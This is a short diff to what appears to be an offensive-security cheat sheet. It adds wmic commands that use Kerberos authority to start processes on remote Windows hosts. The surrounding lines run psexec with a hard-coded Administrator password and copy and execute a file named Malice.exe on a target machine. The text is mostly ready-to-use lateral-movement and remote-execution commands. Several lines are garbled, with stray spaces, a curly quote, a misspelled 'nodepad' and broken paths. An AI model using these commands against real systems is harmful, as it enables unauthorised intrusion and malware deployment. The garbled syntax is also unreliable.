@@ -63,4 +63,9 @@ psexec.exe the shell 192.168 . 200.66 -u Administrator -p @ Hacker . 1 PowerShel
 ```
 copy C:\Windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp
 wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe"
+
+wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
+wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  path win32_process call create calc.exe
+wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  "cmd /c ipconfig"
+wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
 ```
